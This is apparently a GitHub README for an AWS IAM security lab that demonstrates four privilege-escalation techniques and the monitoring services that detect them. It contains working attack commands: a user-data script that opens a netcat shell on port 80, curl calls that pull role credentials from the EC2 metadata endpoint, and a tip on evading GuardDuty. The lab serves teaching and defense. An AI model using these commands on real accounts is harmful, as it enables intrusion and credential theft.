# AWS IAM Security

This repository demonstrates common AWS IAM security vulnerabilities and privilege escalation techniques through hands-on examples. You will learn how seemingly harmless IAM configurations can lead to complete account compromise, and more importantly, how to prevent these security gaps

## Table of Contents

1. [Users vs Roles vs User Groups](#1-users-vs-roles-vs-user-groups)
   1. [User Groups](#11-user-groups)
   2. [Users](#12-users)
   3. [Roles](#13-roles)
2. [Exploits](#2-exploits)
   1. [IAM Privilege Escalation - sts::AssumeRole](#21-iam-privilege-escalation---stsassumerole)
   2. [EC2 Privilege Escalation - ec2::RunInstances and iam::PassRole](#22-ec2-privilege-escalation---ec2runinstances-and-iampassrole)
   3. [IAM Privilege Escalation - iam::CreateAccessKey](#23-iam-privilege-escalation---iamcreateaccesskey)
   4. [IAM Privilege Escalation - iam::AddUserToGroup](#24-iam-privilege-escalation---iamaddusertogroup)
3. [Mitigations](#3-mitigations)
   1. [AWS CloudTrail](#31-aws-cloudtrail)
   2. [AWS Config](#32-aws-config)
   3. [AWS GuardDuty](#33-aws-guardduty)
      1. [Running Nmap for Ping Sweep](#331-running-nmap-for-ping-sweep)
      2. [Unusual API Calls from unusual IP](#332-unusual-api-calls-from-unusual-ip)
   4. [3.4 AWS IAM Access Analyzer](#34-aws-iam-access-analyzer)


## 1. Users vs Roles vs User Groups

We will first investigate the difference between Users, Roles, and User Groups

### 1.1 User Groups

User Groups are like a folder for IAM users. You can add users to that folder then attach permission policies to it. Any user in the group automatically gets those permissions. This way you can manage access for many users at once.

![iam user group dashboard](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_user_group_dashboard.png)
First, we will see the IAM - User Group Dashboard. Currently we did not create any group yet.

![iam user group create page](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_user_group_create_iam_management.png)
We will create an "IAM Management" user group, where IT service department (imaginary) can help you with the account creation and troubleshooting.

![iam user group IAM permissions](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_user_group_iam_permissions.png)
Here, I assigned all the permissions except the Root password create, delete, and audit permission. Since the IT department should not have the control of root but left the "IAM Full Access" permission which can be misused. (Will be exploited later in the lab)

### 1.2 Users

Users are account for a person or an application.  You give it a name and credentials (a password or access keys) so it can sign in or call AWS services.  You can attach permission policies to that user to grant it the rights it needs.

![iam user create](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_user_create_user_detail.png)
We will create an account called iam-service, so helpdesk professionals can use this account to resolve account troubleshooting.

![iam user assign permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_user_create_assign_permission.png)
We will assign the "IAM-Management" permission which we created earlier. We will demonstrate the privilege escalation later using this account

![iam user creation review](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_user_create_user_review.png)
Now we can review the new user detail and create it.

### 1.3 Roles

Roles are job description you hand out on demand. Instead of a long lived user account with its own password or keys, a role has a set of permissions that anyone with the given permission can “assume” it and get the privilege temporarily.

![iam role type selection](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_select_entity.png)
Select the type of role, you want to create. AWS service is a service account used for particular service such as EC2. Since we are going to use it for temporary permission assigning, we will select AWS account.

![iam role add permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_create_assign_permission.png)
Assign the permission that you want to allow the role to have. Here, I will give "AdministratorAccess" to the role I'm creating

![iam role add name and detail](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_create_role_detail.png)
I gave the name "AdminAccess" which is gonna be used by my "test-user" to gain admin privilege

![iam test user no permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_test_user_no_permission.png)
Currently there's no permission assigned to "test user". Now we are going to click "Add permissions" -> "Create inline policy" to assign the "AdminAccess" role privilege.

![iam test user assigning assume role privilege](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_assign_assumerole_to_user_1.png)
Here we will use json schema, then give "sts::AssumeRole" permission inside "Action", ARN of the role we want to use in the "Resource" section.

Here is the sample json schema:

```json
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Sid": "Statement1",
   "Effect": "Allow",
   "Action": "sts:AssumeRole",
   "Resource": "arn:aws:iam::{aws account id}:role/AdminAccess"
  }
 ]
}
```

![iam test user inline policy name](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_assign_assumerole_to_user_2.png)
Next we will give the name of the inline policy (AssumeRole inline policy) as "TempAdminAccess". Create policy to give AdminAccess role access to the test user.

![iam test user no permission iam dashboard](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_test_user_no_permission_iam_dashboard.png)
We login as "test user" now. We can see we do not have any permission to view or modify in IAM dashboard, hence we will switch to "AdminAccess" role to gain privilege.

Click the top-right corner which displays the username @ account. Then select "Switch Role" to use "AssumeRole" privilege.

![iam switch role to AdminAccess](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_switch_role.png)
Fill in the correct account info, role name then confirm to switch to "AdminAccess" role

![iam switch role no permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_switch_role_no_permission.png)
> [!IMPORTANT]
> If you do not have "AssumeRole" policy in your user account, you will see this error above!

![iam switched to AdminAccess](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_switch_from_user.png)
Now we have the "AdminAccess" role privilege, so let's goto IAM dashboard again to check if we got access

![iam dashboard full access using AdminAccess](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_test_user_iam_dashboard_full_access.png)
We can see IAM dashboard now!

## 2. Exploits

### 2.1 IAM Privilege Escalation - sts::AssumeRole

Above, we gave [IAM Management User Group](#11-user-groups) with Full IAM Permission as IT department may need to troubleshoot with employee account, and to resolve, various IAM permission is required. However, giving full IAM Access is dangerous as we can escalate privilege to root using AssumeRole or other privileges.

Here we will self assign privilege using the "IAM Management" group privilege we created.

![iam service no privilege to access cloudtrail](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_no_cloudtrail_access.png)
We have a scenario where the IT service department want to access cloudtrail for curiousity, but they do not have permission to access it

![go to iam service user profile](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_self_assign_role_1.png)
Goto own user profile (iam service) then "Add permission" -> "Create inline policy"

![Assigning assume role privilege](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_self_assign_role_2.png)
Give "sts::AssumeRole" permission inside "Action", ARN of the role we want to use in the "Resource" section. [We did this before](#13-roles)

![iam service inline policy name](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_self_assign_role_3.png)
Assign the policy name to itself. (You can name whatever you want! Since this is a lab)

![iam service switch role](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_self_assign_role_4.png)
Click "Switch role" or if you have already have role registered, switch it [Refer here if you do not understand](#13-roles)

![iam service to AdminAccess](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_self_assign_role_5.png)
On the top-right, you can see we have successfully switched to "AdminAccess" role. You can now access CloudTrail as we got the administrative privilege.

### 2.2 EC2 Privilege Escalation - ec2::RunInstances and iam::PassRole

We will show how to escalate privilege using EC2 RunInstance and PassRole permission. This is a common attack vector where an attacker can launch an EC2 instance with a role that has more permissions than the user currently has.

![create hacker user](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_credential_exfiltration_user.png)
![hacker user permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_credential_exfiltration_user_perm.png)
First, we will create a user called "hacker" with the ec2::RunInstance and iam::PassRole permission.

Make a script called `malicious.sh` with the following content:

```bash
#!/bin/bash
sudo busybox nc -lp 80 -e /bin/bash
```

> [!IMPORTANT]
> You need to know the security group name that allows inbound traffic on port 80. In this case, we will use "Default Web" security group which allows inbound traffic on port 80.

This script will open a reverse shell on port 80, allowing the attacker to connect to the instance.

```bash
aws ec2 run-instances --image-id <machine image or operating system used by the system> --instance-type t2.micro --iam-instance-profile Name=<IAM role for EC2> --user-data file://malicious.sh --security-groups "Default Web" --profile hacker
```

After running the above command, you will have a new EC2 instance running with the malicious script. The attacker can now get a reverse shell by connecting to the instance on port 80.

![ec2 instance running reverse shell](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_credential_exfiltration_reverse_shell.png)
Connect to port 80 of the EC2 instance to get a reverse shell. Then extract the credentials from the metadata endpoint using the command:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Get the role name
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Extract the credentials
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Using the credentials extracted from the metadata, the attacker can use the AWS API key in aws cli to be used for enumeration and exploit.

However, the above method is not recommended as it can be [detected by AWS GuardDuty](#332-unusual-api-calls-from-unusual-ip). Instead, you can enumerate directly using the reverse shell or ssh into the instance.

### 2.3 IAM Privilege Escalation - iam::CreateAccessKey

![test-user containing create access key permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_access_key_user_creation.png)
![create access key permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_access_key_user_perm.png)
Here we will give "test-user" the create access key permission so that it can create the access keys for other users.

![create target with higher privilege](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_access_key_create_target.png)
Next, we will create a "target" user that has higher privilege than the "test-user"

```bash
aws iam create-access-key --user-name target --profile test-user
```
After using the command for the "target" user, we will get the access and secret key for "target"

![target user credentials using create access key](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_access_key_target_access_key_generation.png)
Finally we will verify the user of the access key after configuring to aws cli `aws configure --profile target`

We can verify the identity of target through the command:

```bash
aws sts get-caller-identity --profile target
```

After that we can get the "target" identity

![target sts identity](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_access_key_target_pwned.png)

### 2.4 IAM Privilege Escalation - iam::AddUserToGroup

![create add user to group policy](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_add_user_to_group_policy.png)
![assign test user to add user to group policy](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_add_user_to_group_user_perm.png)
Here we will give "test-user" the "add user to group" permission so that it can assign the group to users.

![test user group before exploit](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_add_user_to_group_test_user_groups.png)
We can see the test-user do not have any group assigned

Let's use the command below:

```bash
aws iam add-user-to-group --group-name AdminGroup --user-name test-user --profile test-user
```

![test user group after exploit](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_add_user_to_group_user_groups_after_exploit.png)
After that we can see "AdminGroup" assigned to "test-user"

## 3. Mitigations

### 3.1 AWS CloudTrail

CloudTrail is AWS audit logging service that records all API calls and administrative actions in your AWS account. You can use this record to search for any security detection and investigations.

![cloudtrail creation](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_cloudtrail_create_trail.png)
Create a trail workflow in order to record the logs. After creating the trail, you can log and view all the logs happen after that.

![cloudtrail assume role detection](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_cloudtrail_switchrole_event_1.png)
You can detect [sts::AssumeRole](#13-roles) by searching for switchrole in cloudtrail. If you click the event, you can get further information in detail.

![cloudtrail detection specifics](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_cloudtrail_switchrole_event_2.png)
![cloudtrail detection specifics](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_cloudtrail_switchrole_event_3.png)
Here you can get the event information such as ip address of the source, instance/resource it used, the user/role it used for the access, the web browser information (user-agent) used to connect to the instance.

### 3.2 AWS Config

AWS Config is a compliance monitoring service that continuously tracks your AWS resource configurations and evaluates them against security best practices. Config warns you about dangerous configurations before they can be exploited.

![config iam setting](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_config_setting_iam.png)
First, we need to enable AWS Config to monitor IAM resources. Start the configuration process to track IAM policies, roles, and users.

![config iam rules](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_config_iam_rule.png)
AWS Config provides managed rules specifically for IAM security (There's others, but I specifically filtered the rules for IAM).

![config setting review](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_config_setting_review.png)
Review the configuration settings before enabling Config. This will start monitoring all changes to your IAM resources and evaluate them against compliance rules automatically.

![config compliance status](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_config_iam_rules_compliance_status.png)
The compliance dashboard shows which IAM resources violate security best practices. Here it shows I got few IAM bad practices such as password weakness, inline policy for AssumeRole.

### 3.3 AWS GuardDuty

AWS GuardDuty is a threat detection service that continuously monitors for malicious activity and unauthorized behavior to protect your AWS accounts, workloads, and data. GuardDuty finds threats by analyzing AWS CloudTrail event logs, VPC Flow Logs, and DNS logs.

![guardduty configuration for ec2](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_monitoring_setup_1.png)
First, enable GuardDuty. Then goto "Runtime Monitoring" to configure the service to monitor EC2 instances.

![vpc flow log configuration for guardduty](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_monitoring_setup_2.png)
Next, you need to enable VPC Flow Logs to monitor network traffic. This is required for GuardDuty to analyze network activity and detect threats.

![guardduty ec2 monitoring dashboard](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_dashboard.png)
The GuardDuty dashboard shows the status of your threat detection setup. It will start monitoring your instances and network traffic for suspicious activity.

#### 3.3.1 Running Nmap for Ping Sweep

Let's say your instance is compromised and the attacker is trying to scan your network using Nmap. GuardDuty will detect this malicious activity.

```bash
nmap -sn <target-ip>/<cidr>
```

![guardduty nmap detection](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_nmap_detection_1.png)
GuardDuty will alert you about the Nmap scan attempt. You can see the details of the detection.

![guardduty nmap detection details 1](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_nmap_detection_2.png)
![guardduty nmap detection details 2](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_nmap_detection_3.png)
![guardduty nmap detection details 3](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_nmap_detection_4.png)
You can see the specific details of the Nmap scan, including the instance, hacker details, and the process used for the attack. This helps you understand the attacker's intent and take appropriate action.

#### 3.3.2 Unusual API Calls from unusual IP

If an attacker is using the compromised instance to make unusual API calls, GuardDuty will also detect this. For example, you can extract the EC2 instance credentials from the metadata using the command `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. This can extract the temporary role credentials used by the instance.

Using these credentials, the attacker can use the AWS CLI to make API calls. For example, they can start enumerating IAM users:

```bash
aws iam list-users --profile <role-name>
```

![kali linux aws enum using ec2 role credentials](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_kali_enum.png)
Using the credentials extracted from the metadata, the attacker can use the AWS API key to enumerate IAM users and perform other actions. GuardDuty will detect this unusual activity.

> [!IMPORTANT]
> You need to extract the credentials from the metadata endpoint and use them in different endpoint to make API calls to trigger GuardDuty detection.

![guardduty unusual api call detection](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_kali_detection_1.png)
![guardduty list-users detection 1](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_kali_detection_2.png)
![guardduty list-users detection 2](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_guardduty_ec2_kali_detection_3.png)
GuardDuty will alert you about the unusual API calls made from the compromised instance. You can see the details of the detection, including the specific API calls made and the instance involved.

### 3.4 AWS IAM Access Analyzer

AWS IAM Access Analyzer helps you identify resources in your account that are shared with other AWS accounts or is unused.

![create unused access analyzer](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_access_analyzer_create_unused_access.png)
First, you need to create an Access Analyzer. "Unused access analyzer" will identify resources that are not being used.

![unused access analyzer dashboard](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_access_analyzer_unused_access_dashboard.png)
Next, you can see the dashboard of the unused access analyzer.

![unused account](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_access_analyzer_unused_account.png)
The unused password shows the accounts that have not been used for the set period of time which we configured it for 3 days.

![unused access by admin](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_access_analyzer_unused_access_admin_1.png)
We can see all the unused permission by admin account. This is useful to identify unused permissions that can be removed to reduce the attack surface

![permission recommendation for admin](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_access_analyzer_unused_access_admin_2.png)
![permission recommendation for admin](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_access_analyzer_unused_access_admin_3.png)
You can see the permission recommendation for the admin account to remove unused permissions.
